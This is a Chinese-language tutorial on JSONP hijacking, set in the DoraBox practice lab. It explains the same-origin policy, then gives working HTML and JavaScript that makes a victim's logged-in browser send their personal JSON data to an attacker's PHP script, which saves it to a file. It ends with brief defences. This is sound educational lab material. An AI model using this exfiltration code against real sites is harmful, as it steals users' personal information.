# JSONP描述

Jsonp(JSON with Padding) 是 json 的一种"使用模式"，可以让网页从别的域名（网站）那获取资料，即跨域读取数据。

为什么我们从不同的域（网站）访问数据需要一个特殊的技术(JSONP )呢？这是因为同源策略，同源策略，它是由 Netscape 提出的一个著名的安全策略，现在所有支持 JavaScript 的浏览器都会使用这个策略。传入 callback 值会在结果里面直接返回。因此，如果该参数过滤不严格。可以随便输入：callback 值为：alert('1');parseResponse 字符串，返回结果会打印个 alert 窗口，然后也会正常执行。

**攻击者模拟用户向有漏洞的服务器发送 JSONP 请求，然后就获取到了用户的某些信息，再将这些信息发送到攻击者可控的服务**

# JSONP原理

JSONP 的最基本的原理是：动态添加一个`< script >` 标签，而 script 标签的 src 属性是没有跨域的限制的。由于同源策略的限制，XmlHttpRequest 只允许请求当前源(域名、协议、端口都相同)的资源，如果要进行跨域请求， 我们可以通过使用 html 的 script 标记来进行跨域请求，并在响应中返回要执行的script 代码，其中可以直接使用 JSON 传递 javascript 对象。

考虑这样一种情况，存在两个网站 A 和 B，用户在网站 B 上注册并且填写了自己的用户名，手机号，身份证号等信息，并且网站 B 存在一个 jsonp 接口，用户在访问网站 B 的时候。这个 jsonp 接口会返回用户的个人信息，并在网站 B 的 html 页面上进行显示。如果网站 B 对此 jsonp 接口的来源验证存在漏洞，那么当用户访问网站 A 时，网站 A 便可以利用此漏洞进行 JSONP 劫持来获取用户的信息。

<img src="图片\Snipaste_2023-03-17_17-14-39.png" alt="Snipaste_2023-03-17_17-14-39" style="zoom:67%;" />

# 攻击方法

攻击方法与 csrf 类似，都是需要用户登录帐号，身份认证还没有被消除的情况下**被诱导**访问攻击者精心设计好的的页面。就会获取 json 数据，把 json 数据发送给攻击者。寻找敏感 json 数据 api 接口，构造恶意的代码。发送给用户，用户访问有恶意的页面，数据会被劫持发送到远程服务器。

# 案例

DoraBox 靶场

<img src="图片\Snipaste_2023-03-17_17-18-09.png" alt="Snipaste_2023-03-17_17-18-09" style="zoom:80%;" />

## 简单测试

测试代码：

```html
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>JSONP劫持测试</title>
</head>
<body>
<script type="text/javascript">
function test(result)
        {
            alert(result.address);
        }
</script>
<script type="text/javascript" src="http://127.0.0.1:8081/dorabox/csrf/jsonp.php?callback=test"></script>
</body>
</html>
```

点击后触发

<img src="图片\Snipaste_2023-03-17_17-24-18.png" alt="Snipaste_2023-03-17_17-24-18" style="zoom:80%;" />

## 进阶利用

`jsonp.html` ，构造 jsonp 劫持代码：

```html
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title></title>
<script src="http://apps.bdimg.com/libs/jquery/1.10.2/jquery.min.js"></script>
<script>
function test(data){
//alert(v.name);
var xmlhttp = new XMLHttpRequest();
var url = "http://127.0.0.1:8081/jsonp-get.php?file=" + JSON.stringify(data);
xmlhttp.open("GET",url,true);
xmlhttp.send();
}
</script>
<script src="http://127.0.0.1:8081/dorabox/csrf/jsonp.php?callback=test"></script>
</head>
<body>
</body>
</html>
```

`jsonp-get.php` 远程文件写入代码:

```php
<?php
if($_GET['file']){
file_put_contents('json.txt',$_GET['file']);
}
?>
```

诱导受害者访问 jsonp.html 时，触发黑客服务器上的 `jsonp-get.php` 代码于是生成了 `json.txt` 文件，json.txt 里写入了受害者敏感信息

<img src="图片\Snipaste_2023-03-17_17-34-26.png" alt="Snipaste_2023-03-17_17-34-26" style="zoom:80%;" />

# jsonp 防御方案

json 正确的 http 头输出尽量避免跨域的数据传输，对于同域的数据传输使用 xmlhttp 的方式作为数据获取的方式，依赖于 javascript 在浏览器域里的安全性保护数据，如果是跨域的数据传输，必须要对敏感的数据获取做权限认证。

